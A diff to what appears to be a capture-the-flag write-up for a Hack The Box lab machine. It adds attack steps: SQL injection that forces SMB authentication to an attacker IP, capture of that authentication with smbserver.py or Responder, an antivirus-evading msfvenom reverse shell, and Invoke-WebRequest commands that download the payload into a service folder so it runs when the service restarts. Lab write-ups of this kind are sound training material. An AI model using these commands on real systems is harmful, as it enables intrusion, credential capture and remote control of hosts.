@@ -83,7 +83,11 @@ request:
 
 `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=10; EXEC MASTER.sys.xp_dirtree '\\10.10.14.19'`
 
-listen:
+listen with smbserver.py
+
+`/root/impacket/examples/smbserver.py share ~/emptyfolder/`
+
+Alternatively listen with Responder:
 
 `./Responder.py -I tun0 -w -r -f`
 
@@ -141,6 +145,8 @@ So, first, we should generate reverse shell:
 
 ![msfvenom](/assets/msfvenom-10.10.10.104.png)
 
+Serve contents of our folder with python `python -m SimpleHTTPServer 80`
+
 and upload our file:
 
 `Invoke-WebRequest -o taskkill.exe http://10.10.14.19/taskkill.exe`
@@ -165,15 +171,24 @@ We will use following options.
 ![phantom2](/assets/phantom2-10.10.10.104.png)
 
 here we choose Msfvenom
-And for encoding option 4: x86/xor_dynamic + Triple Multibyte-key xor
+
+payload: `windows/shell_reverse_tcp`
+
+And for encoding option 4: `x86/xor_dynamic + Triple Multibyte-key xor`
 
 ![phantom3](/assets/phantom3-10.10.10.104.png)
 
 for multi processes behaviour , stripping and signing the executable we choose not to do that
 This time when we upload the file it will work
 
+Again, serve contents of our folder with python `python -m SimpleHTTPServer 80`
 
-Lets restart service and see waht is going on:
+and upload taskkill.exe file to C:\ProgramData\unifi-video\
+
+`Invoke-WebRequest -o C:\ProgramData\unifi-video\taskkill.exe http://10.10.14.19/taskkill.exe`
+
+
+Lets restart service and see what is going on:
 Restart-Service -Name "Ubiquiti UniFi Video"
 
 ![Restart Service](/assets/restart-service-10.10.10.104.png)
